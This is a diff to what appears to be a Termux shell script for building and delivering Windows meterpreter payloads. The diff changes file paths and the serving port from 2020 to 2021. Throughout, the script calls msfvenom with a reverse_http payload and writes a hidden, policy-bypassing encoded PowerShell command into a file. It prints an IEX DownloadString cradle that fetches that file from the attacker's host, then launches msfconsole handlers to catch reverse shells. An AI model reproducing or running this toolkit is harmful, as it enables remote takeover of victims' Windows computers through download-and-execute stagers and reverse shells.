@@ -79,7 +79,7 @@ touch /data/data/com.termux/files/home/$p00r
 
 
 banner0 () {
-	rm -f /data/data/com.termux/files/home/0/xx0 > /dev/null 2>&1
+	rm -f /data/data/com.termux/files/home/storage/downloads/xx0 > /dev/null 2>&1
 #cd /data/data/com.termux/files/home/99/0/x1
 
 	echo ""
@@ -97,7 +97,7 @@ P A Y L O A D ░$cy ＳｈｅｌｌＣｏｄｅ $fin
 
 IEX (New-Object Net.WebClient).DownloadString
    
-     ('http://localhost:2020/xx0')"
+     ('http://localhost:2021/xx0')"
 }
 
 
@@ -171,14 +171,14 @@ ffuera0x32 () {    msfvenom -p windows/meterpreter/reverse_http LHOST=m4trix.syt
 
 ven0m() {
 
- touch /data/data/com.termux/files/home/0/xx0
+ touch /data/data/com.termux/files/home/storage/downloads/xx0
   shellx=`cat /data/data/com.termux/files/home/99/0/x1/mtx.raw | awk {'print $12'}`
-  echo "powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellx" >> /data/data/com.termux/files/home/0/xx0
+  echo "powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellx" >> /data/data/com.termux/files/home/storage/downloads/xx0
   cd /data/data/com.termux/files/home/99/0/x1
   rm -f *.raw
 
 #########################
-bata="/data/data/com.termux/files/home/0/xx0"
+bata="/data/data/com.termux/files/home/storage/downloads/xx0"
 #clear 
   
 
@@ -218,7 +218,7 @@ clear
     echo "
 
 [$azu IEX (New-Object Net.WebClient).DownloadString
-        ('http://$ip:2020/xx0')$fin]
+        ('http://$ip:2021/xx0')$fin]
    
     "
   msfconsole -x "use exploit/multi/handler;set PAYLOAD windows/x64/meterpreter/reverse_http;set LPORT 1985;set LHOST $ip;exploit"
@@ -229,7 +229,7 @@ enterx32 () {
     echo "
 
 [$azu IEX (New-Object Net.WebClient).DownloadString
-        ('http://$ip:2020/xx0')$fin]
+        ('http://$ip:2021/xx0')$fin]
    
     "
   msfconsole -x "use exploit/multi/handler;set PAYLOAD windows/meterpreter/reverse_http;set LPORT 1985;set LHOST $ip;exploit"
